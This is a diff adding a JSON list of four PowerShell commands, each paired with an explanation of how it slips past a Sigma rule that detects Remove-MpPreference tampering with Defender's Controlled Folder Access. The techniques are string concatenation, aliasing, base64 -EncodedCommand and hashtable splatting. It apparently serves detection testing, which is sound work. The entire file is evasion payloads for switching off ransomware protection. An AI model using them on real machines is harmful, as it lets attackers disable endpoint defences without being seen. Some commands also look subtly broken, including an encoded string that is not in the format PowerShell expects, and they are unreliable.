@@ -1,0 +1,18 @@
+[
+  {
+    "output": "powershell.exe -ExecutionPolicy Bypass -Command \"$cmd = 'Remove-Mp' + 'Preference'; Invoke-Expression ($cmd + ' -ControlledFolderAccessProtectedFolders C:\\Users\\Public')\"",
+    "explanation": "This bypass uses string concatenation to break up the 'Remove-MpPreference' keyword. Since the Sigma rule uses a simple 'contains' check on the CommandLine, it fails to match when the cmdlet name is not present as a single contiguous string in the process creation logs."
+  },
+  {
+    "output": "powershell.exe -Command \"Set-Alias -Name 'RMP' -Value 'Remove-MpPreference'; RMP -ControlledFolderAccessProtectedFolders 'C:\\Secret'\"",
+    "explanation": "This approach utilizes PowerShell Aliasing. By renaming the cmdlet to 'RMP' within the session, the actual execution command line recorded by the OS does not contain the literal string 'Remove-MpPreference', thus bypassing the selection_remove filter."
+  },
+  {
+    "output": "powershell.exe -EncodedCommand UmVtb3ZlLU1wUHJlZmVyZW5jZSAtQ29udHJvbGxlZEZvbGRlckFjY2Vzc1Byb3RlY3RlZEZvbGRlcnMgQzpcVGVtcA==",
+    "explanation": "The Sigma rule targets process creation logs via 'CommandLine|contains'. By using Base64 encoding (-EncodedCommand), the sensitive strings are masked from simple pattern matching filters that do not perform automatic decoding of PowerShell arguments."
+  },
+  {
+    "output": "powershell.exe \"& { $p = @{ 'Controlled' + 'FolderAccessProtectedFolders' = 'C:\\' }; Remove-MpPreference @p }\"",
+    "explanation": "This bypass targets the 'selection_tamper' part of the rule. By using a splatting technique with concatenated dictionary keys, the literal string '-ControlledFolderAccessProtectedFolders ' (including the trailing space or specific hyphenation) is never explicitly present in the command line string."
+  }
+]
